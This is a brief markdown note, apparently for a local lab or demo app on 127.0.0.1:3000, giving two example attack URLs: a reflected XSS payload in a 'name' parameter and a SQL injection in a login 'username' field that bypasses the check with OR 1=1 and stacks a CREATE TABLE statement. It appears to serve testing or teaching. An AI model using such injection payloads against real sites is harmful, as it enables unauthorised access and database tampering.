# XSS Injection

```
http://127.0.0.1:3000/welcome?name=<script>alert("Hello world")</script>
```

# SQL Injection

## Create Table

```
http://127.0.0.1:3000/login?username=test' OR 1=1; CREATE TABLE new_table_name(id INT, name VARCHAR(255)); --
```